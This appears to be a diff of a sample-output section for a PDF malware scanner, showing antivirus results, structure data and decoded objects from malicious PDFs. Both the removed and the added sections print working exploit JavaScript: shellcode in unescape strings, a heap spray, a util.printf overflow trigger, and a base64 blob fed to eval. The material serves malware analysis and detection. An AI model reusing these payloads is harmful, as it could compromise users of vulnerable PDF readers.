@@ -19,164 +19,250 @@ Options:
 
 == Sample Output == 
 {
-	"scans": {
-		"wepawet": "null", 
-		"virustotal": {
-			"report": [
-				"2010-12-11 16:51:35", 
-				{
-					"nProtect": "Exploit.PDF-Name.Gen", 
-					"CAT-QuickHeal": "", 
-					"McAfee": "", 
-					"TheHacker": "", 
-					"K7AntiVirus": "", 
-					"VirusBuster": "", 
-					"NOD32": "PDF/Exploit.Gen", 
-					"F-Prot": "JS/ShellCode.AX.gen", 
-					"Symantec": "Bloodhound.Exploit.213", 
-					"Norman": "PDF/Suspicious.D", 
-					"TrendMicro-HouseCall": "JS_UTOTI.OB", 
-					"Avast": "JS:Pdfka-AK", 
-					"eSafe": "PDF.Exploit", 
-					"ClamAV": "Heuristics.PDF.ObfuscatedNameObject", 
-					"Kaspersky": "Exploit.JS.Pdfka.cil", 
-					"BitDefender": "Exploit.PDF-JS.Gen", 
-					"SUPERAntiSpyware": "", 
-					"Emsisoft": "Exploit.JS.Pdfka!IK", 
-					"Comodo": "UnclassifiedMalware", 
-					"F-Secure": "Exploit.PDF-JS.Gen", 
-					"DrWeb": "", 
-					"VIPRE": "Exploit.PDF-JS.Gen (v)", 
-					"AntiVir": "EXP/PDF.JS.6378", 
-					"TrendMicro": "JS_UTOTI.OB", 
-					"McAfee-GW-Edition": "Heuristic.BehavesLike.PDF.Suspicious.F", 
-					"Sophos": "Troj/PDFJs-B", 
-					"eTrust-Vet": "PDF/Pidief.TD", 
-					"Jiangmin": "", 
-					"Command": "", 
-					"Antiy-AVL": "", 
-					"Microsoft": "TrojanDownloader:Win32/Small.gen!C", 
-					"ViRobot": "", 
-					"Prevx": "", 
-					"GData": "Exploit.PDF-JS.Gen", 
-					"AhnLab-V3": "PDF/Exploit-script", 
-					"VBA32": "Exploit.JS.Pdfka.cil", 
-					"PCTools": "HeurEngine.MaliciousExploit", 
-					"Rising": "", "Ikarus": "Exploit.JS.Pdfka", 
-					"Fortinet": "", 
-					"AVG": "", 
-					"Panda": "", 
-					"Avast5": "JS:Pdfka-AK"
-				}
-			], 
-			"permalink": "http://www.virustotal.com/file-scan/report.html?id=eb7d1c351d81a619988ab907fd664aeb4b175a84c45378f405c1102810194980-1292086295", 
-			"result": 1
-		}
-	},
-	 
-	"structure": {
-		"countChatAfterLastEof": "0", 
-		"errorMessage": "", 
-		"dates": {
-			"date": []
-		}, 
-		"filename": "../../PDFs/files/fe53357e06be3644d535133cbee3dd67.pdf.vir", 
-		"nonStreamEntropy": "4.916826", 
-		"header": "%PDF-1.5", 
-		"version": "0.0.11", 
-		"entropy": "", 
-		"totalEntropy": "7.886452", 
-		"isPdf": "True", 
-		"keywords": {
-			"keyword": [
-				{"count": 6, "hexcodecount": 0, "name": "obj"}, 
-				{"count": 6, "hexcodecount": 0, "name": "endobj"}, 
-				{"count": 1, "hexcodecount": 0, "name": "stream"}, 
-				{"count": 1, "hexcodecount": 0, "name": "endstream"}, 
-				{"count": 1, "hexcodecount": 0, "name": "xref"}, 
-				{"count": 1, "hexcodecount": 0, "name": "trailer"}, 
-				{"count": 1, "hexcodecount": 0, "name": "startxref"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/Page"}, 
-				{"count": 0, "hexcodecount": 0, "name": "/Encrypt"}, 
-				{"count": 0, "hexcodecount": 0, "name": "/ObjStm"}, 
-				{"count": 1, "hexcodecount": 0, "name": "/JS"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/JavaScript"}, 
-				{"count": 0, "hexcodecount": 0, "name": "/AA"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/OpenAction"}, 
-				{"count": 0, "hexcodecount": 0, "name": "/AcroForm"}, 
-				{"count": 0, "hexcodecount": 0, "name": "/JBIG2Decode"}, 
-				{"count": 0, "hexcodecount": 0, "name": "/RichMedia"}, 
-				{"count": 0, "hexcodecount": 0, "name": "/Launch"}, 
-				{"count": 0, "hexcodecount": 0, "name": "/Colors > 2^24"}, 
-				{"count": 2, "hexcodecount": 0, "name": "/4"}, 
-				{"count": 1, "hexcodecount": 0, "name": "/7kD"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/ASCIIHexDecode"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/Action"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/Catalog"}, 
-				{"count": 2, "hexcodecount": 2, "name": "/Count"}, 
-				{"count": 1, "hexcodecount": 0, "name": "/D"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/Filter"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/FlateDecode"}, 
-				{"count": 1, "hexcodecount": 0, "name": "/J2"}, 
-				{"count": 1, "hexcodecount": 0, "name": "/K"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/Kids"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/Length"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/MediaBox"}, 
-				{"count": 1, "hexcodecount": 0, "name": "/Nw"}, 
-				{"count": 2, "hexcodecount": 2, "name": "/Outlines"}, 
-				{"count": 2, "hexcodecount": 2, "name": "/Pages"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/Parent"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/Root"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/S"}, 
-				{"count": 1, "hexcodecount": 1, "name": "/Size"}, 
-				{"count": 5, "hexcodecount": 5, "name": "/Type"}, 
-				{"count": 1, "hexcodecount": 0, "name": "/d"}, 
-				{"count": 1, "hexcodecount": 0, "name": "/g"}, 
-				{"count": 1, "hexcodecount": 0, "name": "/j2U"}
-			]
-		}, 
-		"countEof": "1", 
-		"streamEntropy": "7.959980", 
-		"errorOccured": "False"
-	}, 
-	
-	"hash_data": {
-		"hashes": {
-			"objects": {
-				"object": [
-					{"length": 89, "version": 0, "id": 1, "md5": "b60c8c6827aa107d7266fe4a974029c0"}, 
-					{"length": 46, "version": 0, "id": 2, "md5": "8511ab96e6ff067fa6cecf1aa6c5f0d4"}, 
-					{"length": 51, "version": 0, "id": 3, "md5": "0f71cc95d7e3c7ca6463519443d42b26"}, 
-					{"length": 73, "version": 0, "id": 4, "md5": "bfaf964ecde2bc56534e3d3ce0edc6bd"}, 
-					{"length": 56, "version": 0, "id": 5, "md5": "b5b9672d521e94256cd1cccf33cec78c"}, 
-					{"length": 5742, "version": 0, "id": 6, "md5": "04cba0f9a1d2d8914ff013df552cee1f"}
-				]
-			}, 
-			"file": {
-				"sha256": "eb7d1c351d81a619988ab907fd664aeb4b175a84c45378f405c1102810194980", 
-				"md5": "fe53357e06be3644d535133cbee3dd67", 
-				"sha1": "bada2624083632a9660f466a1a6ef702472f0b18"
-			}
-		}
-	}, 
-	
-	"scores": {
-		"total": "5", 
-		"primary": "5", 
-		"seconday": "0"
-	},
-	
-	"contents": {
-		"objects": {
-			"object": [
-				{"encoded": "<</Ty#70e/#43#61t#61l#6fg/Ou#74li#6ees 2 0 R/Pa#67#65s 3 0 R/#4fpen#41#63#74#69on 5 0 R>>", "id": 1, "decoded": "failed"}, 
-				{"encoded": "<</#54#79#70#65/#4fu#74lin#65s/#43#6f#75nt 0>>", "id": 2, "decoded": "failed"}, 
-				{"encoded": "<</#54ype/P#61ges/#4b#69#64s[4 0 R]/#43o#75n#74 1>>", "id": 3, "decoded": "failed"}, 
-				{"encoded": "<</Typ#65/#50ag#65/P#61#72#65n#74 3 0 R/#4de#64#69aB#6f#78[0 0 612 792]>>", "id": 4, "decoded": "failed"}, 
-				{"encoded": "<</#54y#70#65/Act#69#6fn/#53/Java#53c#72ip#74/JS 6 0 R>>", "id": 5, "decoded": "failed"}, 
-				{"encoded": "failed", "id": 6, "decoded": "\n\t\tvar crOcBpKVifLfEoqKYHkBpReDWNNgqXwgCRsaCJRnEvnToLocGhWhcchHIToCsCqAdTLSlAdZriuLMaQhDsWhdQWfGyVUAoRuyUI = unescape(\"%uf99f%u4a4e%u4837%u4191%u4b4b%ufcf9%ud637%u9743%u4b48%u9b2f%u4298%uf5fc%u9b9b%u9892%u272f%u993f%u2f92%u27f9%u494f%u9248%u9042%u9937%uf837%uf546%u9393%u49f8%uf948%u274e%u974b%u4e99%u4192%u904a%u4827%u9b40%u4a42%u9b43%u4946%u964a%u9946%u9947%u2741%u9b2f%u2f9f%u90f8%u414a%u4b43%u934e%u419f%u9193%u4e9f%u4796%u9793%u4e41%u3f27%u4ffd%u9bf8%ud63f%u97f8%u4699%uf997%u9f99%u4f91%u374b%u2727%u994e%u4698%u4e4e%u27f9%ufd97%u4698%u484f%u9040%u4649%u433f%u2f92%u4947%uf927%u4293%u4f99%uf548%ufd3f%u2ff9%u4637%u4892%u42fc%u2f98%ufc99%u9243%u4e40%u9641%u484e%u4e41%u484f%u4ff9%u939f%u3ffc%ufc4e%u4227%u993f%u9b4b%u9b3f%u4691%u432f%u2f48%u4e91%u3ff9%u9737%ufc37%u43f9%u9793%u9341%uf840%u4197%u4b4a%ufc93%ufd46%u46f8%u484e%u999b%u9ffc%ufc91%u99f8%ud641%u96f5%u374f%u939f%u4399%u4892%u483f%u3f98%uf8fd%u433f%u989b%u984b%u4846%u4296%u97d6%u4342%u3747%u99f8%ud69f%u434b%u4942%uf84e%u40fd%u4397%u4196%u914e%u40f9%u2f49%u4096%u484b%ud699%uf9d6%u9f9b%u9f4a%u2f91%u9247%uf847%ufd4f%ud642%u48f8%u4843%u9b93%uf842%u4b91%uf84e%u4f96%u2792%uf541%u4f4e%u439f%u4896%ufc92%u9841%uf99f%u4642%ud6f9%u9396%u4e92%u3798%u9148%u372f%u40fc%u4a37%u99f5%u91f8%u4a2f%u4a27%u9f9f%u92fc%uf598%u4b99%u4a4b%u91f9%ud63f%u9827%u9399%u9247%u93d6%u2792%u9242%u99f8%uf84e%u903f%u9742%u379b%u4bfc%u4799%u474a%u2740%u41f5%ufc42%uf8f5%uf8f8%u9642%u41fc%u4899%u9b46%u93d6%u279f%ud6f5%u9146%u2792%u4f27%u4393%u4037%ufdfd%u2741%u3747%uf837%u494a%u929b%u9bd6%u4e37%ud691%ufd4e%u4a3f%u9bf9%u424b%u9b4b%u4043%u373f%u4e41%u4b46%uf99f%uf54f%u9398%uf542%u2fd6%u9946%ufd4a%u3796%u90f9%u4727%u2792%ufd3f%u9141%u274a%u902f%u4241%u98f8%u9037%u2793%u4e27%u2f9b%u4027%u4841%uf591%u99d6%u474a%u4e41%u2f97%u484b%u4ff8%u9037%uf5d6%u4349%u4847%u4f49%u37f5%u9391%u934e%u424e%ud643%u4827%ud63f%uf591%uf54a%u4949%u27d6%u274f%u4691%u4227%u464e%u963f%u4afd%u9249%u4649%ud6fc%u4b2f%uc4da%uc929%u74d9%uf424%u63b1%ube5b%u0fa6%u8f75%u7331%u831a%u04c3%u7303%ue216%ue453%ud565%uc8d1%u8f4c%u125c%ud04e%u61aa%u32c9%u9e28%u5aec%u9e27%u6510%u2dc7%u0376%u6dbe%u0c75%ue869%uf41f%ud27b%u15b5%u6192%u0b81%ufbbd%u6af8%u162f%u7e59%u61a2%ue543%u7c56%ua363%ue23c%u0379%u49cd%u6409%u4503%udce0%u3401%u4a17%u2ec6%ue6d7%ubc17%u3649%u24a1%u2a34%u22f1%u94b8%u12cf%u412a%u43dd%uf3f6%u33bb%u9e71%u6e63%u61d1%uff81%u42c0%u6520%u24be%u0152%u8da5%uacb0%u7740%uada6%ue666%u6edc%ue410%u63a9%uc983%u4d58%u5025%u5703%uf709%ua7f8%u39d3%uf49b%u870e%u6390%u76ee%u0df2%ue176%u72e0%udd03%u94cb%ufbb4%uc51f%u54a3%ucdc6%udfce%uc341%uecab%u2e08%udd55%uf11f%u7b07%uf51a%u808f%udbfa%ue56a%u18e3%u8f13%ub949%u79ed%uf547%u1f27%u6f99%ua5aa%ubaec%uebac%uf387%u3a57%uae3a%uf7c1%uf7d8%u971d%ucc28%u9211%u98ce%ue36e%u643c%u4e06%uc019%u3199%u92ff%u903f%ub703%uc709%ub20d%ue552%ua80c%ufc9f%ub604%ufdbe%u0335%u14de%u6828%u34eb%u7a42%u3de8%u8b4f%u22fa%ued57%u5233%ud290%u6f2d%u72a4%u7171%u68a8%u8347%u8fa3%u99a0%ua5aa%u9aa7%u9031%ua0b8%ue322%ub7d2%u8d6c%ud3c9%u5a79%ud3e7%u6f18%uc9c3%u86c7%u063a%u9002%u143b%uab21%u1763%ua84c%u4144%u25c6%u0201%ue92c%udbc6%udb61%u2429%u0db9%u647c%u6397%ub4b3%ue2c8%ud0da%ud42b%u292c%u2663%u3a6b%u22ea%u8c4e%uc4ca%u81d1%u2477%u1e42%u0331%uf716%ufbd1%u6ea4%u8847%uf12e\");\n\t\tvar hCAHdigRShwiugwVAKTWtHwoRURetrrXimXvqisAJleQmaLuikezyMHYFlmJUgUDJOXMnJtyn =\"\";\n\t\tfor (UjNbRzxFGArGCBHOSLusJsNRbeoCSwroLWSYnrWidylZ=128;UjNbRzxFGArGCBHOSLusJsNRbeoCSwroLWSYnrWidylZ>=0;--UjNbRzxFGArGCBHOSLusJsNRbeoCSwroLWSYnrWidylZ) hCAHdigRShwiugwVAKTWtHwoRURetrrXimXvqisAJleQmaLuikezyMHYFlmJUgUDJOXMnJtyn += unescape(\"%uf937%u3737\");\n\t\thZbYeHNJZEBgEZTUlLORBQNLMncslbEaFLtKYHFYmoYXBLyZLPmblSXdCtLpJISZKNKTBWFLkMjsNJ = hCAHdigRShwiugwVAKTWtHwoRURetrrXimXvqisAJleQmaLuikezyMHYFlmJUgUDJOXMnJtyn + crOcBpKVifLfEoqKYHkBpReDWNNgqXwgCRsaCJRnEvnToLocGhWhcchHIToCsCqAdTLSlAdZriuLMaQhDsWhdQWfGyVUAoRuyUI;\n\t\trJDWezOCiexqDpxxZjarNVARi = unescape(\"%uf937%u3737\");\n\t\toUATJhSpmhMlegQHepbMkNhQzbKMIToJa = 20;\n\t\tGTkCOMOKiiILuRvBZyugNYMbGtKubqkWfqIunWZpnXEvMdJQyqtIjAoOCLiTjnKKcyRobjIVXTvxPMisBmltCf = oUATJhSpmhMlegQHepbMkNhQzbKMIToJa+hZbYeHNJZEBgEZTUlLORBQNLMncslbEaFLtKYHFYmoYXBLyZLPmblSXdCtLpJISZKNKTBWFLkMjsNJ.length\n\t\twhile (rJDWezOCiexqDpxxZjarNVARi.length<GTkCOMOKiiILuRvBZyugNYMbGtKubqkWfqIunWZpnXEvMdJQyqtIjAoOCLiTjnKKcyRobjIVXTvxPMisBmltCf) rJDWezOCiexqDpxxZjarNVARi+=rJDWezOCiexqDpxxZjarNVARi;\n\t\trbtwBkDuuKfPsBIUfraPodJtDjmcruVSoYGMIXibxlJGTTrfqbwQUgJKwxJaiFpyGUqTOMojqyUOaPqFoZ = rJDWezOCiexqDpxxZjarNVARi.substring(0, GTkCOMOKiiILuRvBZyugNYMbGtKubqkWfqIunWZpnXEvMdJQyqtIjAoOCLiTjnKKcyRobjIVXTvxPMisBmltCf);\n\t\tqORXKjgryM = rJDWezOCiexqDpxxZjarNVARi.substring(0, rJDWezOCiexqDpxxZjarNVARi.length-GTkCOMOKiiILuRvBZyugNYMbGtKubqkWfqIunWZpnXEvMdJQyqtIjAoOCLiTjnKKcyRobjIVXTvxPMisBmltCf);\n\t\twhile(qORXKjgryM.length+GTkCOMOKiiILuRvBZyugNYMbGtKubqkWfqIunWZpnXEvMdJQyqtIjAoOCLiTjnKKcyRobjIVXTvxPMisBmltCf < 0x40000) qORXKjgryM = qORXKjgryM+qORXKjgryM+rbtwBkDuuKfPsBIUfraPodJtDjmcruVSoYGMIXibxlJGTTrfqbwQUgJKwxJaiFpyGUqTOMojqyUOaPqFoZ;\n\t\tUYtKHVgZTtcooYAPbCYZBjkcDrHIjBDzZEbuhkzHHbCFyAzAZtNseCTPfhi = new Array();\n\t\tfor (acwsUYeEbJQZhveOFRHSdoE=0;acwsUYeEbJQZhveOFRHSdoE<1450;acwsUYeEbJQZhveOFRHSdoE++) UYtKHVgZTtcooYAPbCYZBjkcDrHIjBDzZEbuhkzHHbCFyAzAZtNseCTPfhi[acwsUYeEbJQZhveOFRHSdoE] = qORXKjgryM + hZbYeHNJZEBgEZTUlLORBQNLMncslbEaFLtKYHFYmoYXBLyZLPmblSXdCtLpJISZKNKTBWFLkMjsNJ;\n\t\tutil.printf(\"%45000.45000f\", 0);\n\t\t\t\t\t"}
-			]
-		}
-	}
+    "contents": {
+        "objects": {
+            "object": [
+                {
+                    "decoded": "Object contained no stream or decoding failed", 
+                    "encoded": "\r\n<<\r\n/OpenAction << /JS 9 0 R /S /JavaScript >>\r\n/Type /Catalog\r\n/Pages 3 0 R\r\n>>\r\n", 
+                    "hex": "0D 0A 3C 3C 0D 0A 2F 4F 70 65 6E 41 63 74 69 6F 6E 20 3C 3C 20 2F 4A 53 20 39 20 30 20 52 20 2F 53 20 2F 4A 61 76 61 53 63 72 69 70 74 20 3E 3E 0D 0A 2F 54 79 70 65 20 2F 43 61 74 61 6C 6F 67 0D 0A 2F 50 61 67 65 73 20 33 20 30 20 52 0D 0A 3E 3E 0D 0A", 
+                    "id": 2, 
+                    "length": 84, 
+                    "md5": "211408b743a46d1c2c806d3af9884393", 
+                    "suspicious": 0, 
+                    "version": 0
+                }, 
+                {
+                    "decoded": "Object contained no stream or decoding failed", 
+                    "encoded": "\r\n<<\r\n/Type /Pages\r\n/Kids [4 0 R]\r\n/Count 1\r\n>>\r\n", 
+                    "hex": "0D 0A 3C 3C 0D 0A 2F 54 79 70 65 20 2F 50 61 67 65 73 0D 0A 2F 4B 69 64 73 20 5B 34 20 30 20 52 5D 0D 0A 2F 43 6F 75 6E 74 20 31 0D 0A 3E 3E 0D 0A", 
+                    "id": 3, 
+                    "length": 49, 
+                    "md5": "9829c9b16eba23c82358cad900e4827c", 
+                    "suspicious": 0, 
+                    "version": 0
+                }, 
+                {
+                    "decoded": "Object contained no stream or decoding failed", 
+                    "encoded": "\r\n<<\r\n/Type /Page\r\n/Parent 3 0 R\r\n>>\r\n", 
+                    "hex": "0D 0A 3C 3C 0D 0A 2F 54 79 70 65 20 2F 50 61 67 65 0D 0A 2F 50 61 72 65 6E 74 20 33 20 30 20 52 0D 0A 3E 3E 0D 0A", 
+                    "id": 4, 
+                    "length": 38, 
+                    "md5": "1184e200fcbb6bf356b4fd68626aece6", 
+                    "suspicious": 0, 
+                    "version": 0
+                }, 
+                {
+                    "decoded": "\r\nvar keyStr = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";\r\nfunction decode64(input) {\r\n   var output = \"\";\r\n   var chr1, chr2, chr3;\r\n   var enc1, enc2, enc3, enc4;\r\n   var i = 0;\r\n   input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \"\");\r\n   do {\r\n      enc1 = keyStr.indexOf(input.charAt(i++));\r\n      enc2 = keyStr.indexOf(input.charAt(i++));\r\n      enc3 = keyStr.indexOf(input.charAt(i++));\r\n      enc4 = keyStr.indexOf(input.charAt(i++));\r\n      chr1 = (enc1 << 2) | (enc2 >> 4);\r\n      chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);\r\n      chr3 = ((enc3 & 3) << 6) | enc4;\r\n      output = output + String.fromCharCode(chr1);\r\n      if (enc3 != 64) {\r\n         output = output + String.fromCharCode(chr2);\r\n      }\r\n      if (enc4 != 64) {\r\n         output = output + String.fromCharCode(chr3);\r\n      }\r\n   } while (i < input.length);\r\n   return output;\r\n}\r\nvar aasd = decode64(\"RFFwMllYSWdjRXAyY0dWTElEMGdibVYzSUVGeWNtRjVLQ2s3RFFwbWRXNWpkR2x2YmlCMGEyaHZhQ2h1Y0dGaWJDd2dVeko1V1dkM2JXOHBldzBLSUNCM2FHbHNaU0FvYm5CaFltd3ViR1Z1WjNSb0lDb2dNaUE4SUZNeWVWbG5kMjF2S1hzTkNpQWdJQ0J1Y0dGaWJDQXJQU0J1Y0dGaWJEc05DaUFnZlEwS0lDQnVjR0ZpYkNBOUlHNXdZV0pzTG5OMVluTjBjbWx1Wnlnd0xDQlRNbmxaWjNkdGJ5QXZJRElwT3cwS0lDQnlaWFIxY200Z2JuQmhZbXc3RFFwOURRcG1kVzVqZEdsdmJpQkhaMVZsZVNoWE5XUkhXbnB6S1hzTkNuWmhjaUJXYzBWNVJDQTlJREI0TUdNd1l6QmpNR003RFFvZ0lDQWdJQ0I2UlRKd2VqRmhJRDBnZFc1bGMyTmhjR1VvSWlWMVF6QXpNeVYxT0VJMk5DVjFNekEwTUNWMU1FTTNPQ1YxTkRBNFFpVjFPRUl3UXlWMU1VTTNNQ1YxT0VKQlJDVjFNRGcxT0NWMU1EbEZRaVYxTkRBNFFpVjFPRVF6TkNWMU4wTTBNQ1YxTlRnNFFpVjFOa0V6UXlWMU5VRTBOQ1YxUlRKRU1TVjFSVEl5UWlWMVJVTTRRaVYxTkVaRlFpVjFOVEkxUVNWMVJVRTRNeVYxT0RrMU5pVjFNRFExTlNWMU5UYzFOaVYxTnpNNFFpVjFPRUl6UXlWMU16TTNOQ1YxTURNM09DVjFOVFpHTXlWMU56WTRRaVYxTURNeU1DVjFNek5HTXlWMU5EbERPU1YxTkRFMU1DVjFNek5CUkNWMU16WkdSaVYxUWtVd1JpVjFNRE14TkNWMVJqSXpPQ1YxTURnM05DVjFRMFpETVNWMU1ETXdSQ1YxTkRCR1FTVjFSVVpGUWlWMU0wSTFPQ1YxTnpWR09DVjFOVVZGTlNWMU5EWTRRaVYxTURNeU5DVjFOalpETXlWMU1FTTRRaVYxT0VJME9DVjFNVU0xTmlWMVJETXdNeVYxTURRNFFpVjFNRE00UVNWMU5VWkRNeVYxTlRBMVJTVjFPRVJETXlWMU1EZzNSQ1YxTlRJMU55VjFNek5DT0NWMU9FRkRRU1YxUlRnMVFpVjFSa1pCTWlWMVJrWkdSaVYxUXpBek1pVjFSamM0UWlWMVFVVkdNaVYxUWpnMFJpVjFNa1UyTlNWMU56ZzJOU1YxTmpaQlFpVjFOalk1T0NWMU16TkJRaVYxUWpoRE1DVjFOalEyTVNWMU1EQXdNQ1YxTmpnMU1DVjFOamcxTkNWMU5qVTNNaVYxTWpRek5TVjFOamt4UXlWMU5UQTNOQ1YxTlRNMU5DVjFRVUZDT0NWMU1FUkdReVYxUmtZM1F5VjFNRFExTlNWMVJqZzRRaVYxUXpRNE15VjFRakF3UXlWMU9FRTJReVYxT1RoRk1DVjFOamcxTUNWMU5rVTJSaVYxTmpReVJTVjFOelUyT0NWMU5rTTNNaVYxTlRRMlJDVjFPRVZDT0NWMU1FVTBSU1YxUmtaRlF5VjFNRFExTlNWMU5UQTVNeVYxUXpBek15VjFOVEExTUNWMU9FSTFOaVYxTURRMU5TVjFRekk0TXlWMU9ETTNSaVYxTkVORE1pVjFOVEExTWlWMU16WkNPQ1YxTWtZeFFTVjFSa1kzTUNWMU1EUTFOU1YxTlRjMVFpVjFRamcxTmlWMVJrVTVPQ1YxTUVVNFFTVjFOVFZHUmlWMU5rRXdOQ1YxUmtZd01DVjFOamhFTnlWMU56UTNOQ1YxTTBFM01DVjFNa1l5UmlWMU56YzNOeVYxTmprM055VjFOalUzTkNWMU56TTJSQ1YxTmpNeVJTVjFNa1kyUlNWMU56ZzJOU1YxTWtZMk5TVjFOemcyTlNWMU1rVTJOU1YxTmpnM01DVjFNREEzTUNJcE93MEthV1lnS0ZjMVpFZGFlbk1nUFQwZ01TbDdWbk5GZVVRZ1BTQXdlRE13TXpBek1ETXdPMzBOQ2lBZ0RRb0pDWFpoY2lCSWVIbHVkVUVnUFNBd2VEUXdNREF3TURzTkNna0pkbUZ5SUV0RlNYbDRlbEFnUFNCNlJUSndlakZoTG14bGJtZDBhQ0FxSURJN0RRb0pDWFpoY2lCVE1ubFpaM2R0YnlBOUlFaDRlVzUxUVNBdElDaExSVWw1ZUhwUUlDc2dNSGd6T0NrN0RRb0pDWFpoY2lCdWNHRmliQ0E5SUhWdVpYTmpZWEJsS0NJbGRUa3dPVEFsZFRrd09UQWlLVHNOQ2drSmJuQmhZbXdnUFNCMGEyaHZhQ2h1Y0dGaWJDd2dVeko1V1dkM2JXOHBPdzBLQ1FsMllYSWdkMDlsZGtNZ1BTQW9Wbk5GZVVRZ0xTQXdlRFF3TURBd01Da2dMeUJJZUhsdWRVRTdEUW9KQ1dadmNpQW9kbUZ5SUdWS05tOVhJRDBnTURzZ1pVbzJiMWNnUENCM1QyVjJRenNnWlVvMmIxY2dLeXNnS1hzTkNna0pjRXAyY0dWTFcyVktObTlYWFNBOUlHNXdZV0pzSUNzZ2VrVXljSG94WVRzTkNpQWdmUTBLZlEwS1puVnVZM1JwYjI0Z2JtSk9aVmhvS0NsN0RRb0pkbUZ5SUhOSGJqWklJRDBnWVhCd0xuWnBaWGRsY2xabGNuTnBiMjR1ZEc5VGRISnBibWNvS1RzTkNpQWdEUW9nSUNBZ2FXWWdLSE5IYmpaSUlENGdPQ2w3RFFvTkNpQWdJQ0FnSUNBZ1IyZFZaWGtvTVNrN0RRb2dJQ0FnSUNBZ0lIWmhjaUJSVVhwdFRqSTVaQ0E5SUNJeE1qazVPVGs1T1RrNU9UazVPVGs1T1RrNU9TSTdEUW9nSUNBZ0lDQWdJR1p2Y2lBb1dXaHBaV0l6SUQwZ01Ec2dXV2hwWldJeklEd2dNamMyT3lCWmFHbGxZak1nS3lzZ0tYc05DaUFnSUNBZ0lDQWdJQ0JSVVhwdFRqSTVaQ0FyUFNBaU9DSTdEUW9nSUNBZ0lDQWdJSDBOQ2lBZ0lDQWdJQ0FnZFhScGJDNXdjbWx1ZEdZb0lpVTBOVEF3TUdZaUxDQlJVWHB0VGpJNVpDazdEUW9nSUNBZ2ZRMEtDV2xtSUNoelIyNDJTQ0E4SURncGV3MEtDUWxIWjFWbGVTZ3dLVHNOQ2drSmRtRnlJRVpEYXpoaklEMGdkVzVsYzJOaGNHVW9JaVYxTUdNd1l5VjFNR013WXlJcE93MEtDUWwzYUdsc1pTQW9Sa05yT0dNdWJHVnVaM1JvSUR3Z05EUTVOVElwUmtOck9HTWdLejBnUmtOck9HTTdEUW9KQ1hSb2FYTWdMbU52Ykd4aFlsTjBiM0psSUQwZ1EyOXNiR0ZpTG1OdmJHeGxZM1JGYldGcGJFbHVabThvZXcwS0lDQWdJQ0FnYzNWaWFpQTZJQ0lpTENCdGMyY2dPaUJHUTJzNFkzMHBPdzBLSUNBZ0lIMGdJQTBLQ1EwS0NXbG1JQ2h6UjI0MlNDQThJRGt1TVNrSkRRb0pldzBLQ1dsbUlDaGhjSEF1Wkc5akxrTnZiR3hoWWk1blpYUkpZMjl1S1hzTkNpQWdJQ0FnSUNBZ1IyZFZaWGtvTUNrN0RRb2dJQ0FnSUNBZ0lIWmhjaUIxYUZsemFuZFNVeUE5SUhWdVpYTmpZWEJsS0NJbE1Ea2lLVHNOQ2lBZ0lDQWdJQ0FnZDJocGJHVWdLSFZvV1hOcWQxSlRMbXhsYm1kMGFDQThJREI0TkRBd01DbDFhRmx6YW5kU1V5QXJQU0IxYUZsemFuZFNVenNOQ2lBZ0lDQWdJQ0FnZFdoWmMycDNVbE1nUFNBaVRpNGlJQ3NnZFdoWmMycDNVbE03RFFvSkNXRndjQzVrYjJNdVEyOXNiR0ZpTG1kbGRFbGpiMjRvZFdoWmMycDNVbE1wT3cwS0NYME5DZ2w5RFFwOURRcHVZazVsV0dnb0tUcz0=\");\r\neval(decode64(aasd));", 
+                    "encoded": "\r\n<</Filter /FlateDecode\r\n/Length 2642\r\n>>\r\nstream\r\nx\ufffd\ufffdXms\ufffd\ufffd\u0011\ufffd~3\ufffd\u001f\ufffd\ufffd\ufffd\ufffd'w\tA\ufffdj5w\ufffd\ufffd\ufffd\"(3&d\ufffd\u0004@\ufffd\ufffd\ufffd\ufffd\u0002\u0013J\u0004)Z\ufffd-Y\ufffd\ufffd\ufffd._\ufffd\ufffd\ufffdv\ufffdi>8\ufffd\u0017\ufffd\ufffd\ufffd\ufffd\ufffdE\ufffd\ufffd\ufffd!\ufffd\u000e\ufffd\ufffd1\ufffdo\u0007\u001f\u0007?|\ufffd^\ufffdl\ufffd\ufffd\ufffd\ufffd\ufffd7\u001eY\ufffd\ufffd4\b\u0019\u0017Q,\ufffdt\ufffd\ufffd/_\ufffd\ufffd\ufffd\ufffde\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdx2\ufffd9\u001cY\ufffd\ufffd\ufffdu\ufffd\ufffd\ufffd\ufffd\u001f~\ufffd\ufffd\ufffd/\ufffd\ufffdr\ufffd\ufffdT\u0003\ufffd-7*\u001b\ufffd.VU}\ufffd\ufffd\u001c\ufffd\ufffd\ufffd\ufffd\u0006\ufffdA\ufffdqs\ufffd\ufffd\ufffd4\u001e\u001b\ufffd\ufffd\ufffd\ufffd|\ufffd~l~\ufffd\ufffd\ufffd\ufffd\ufffd$\ufffd\ufffd 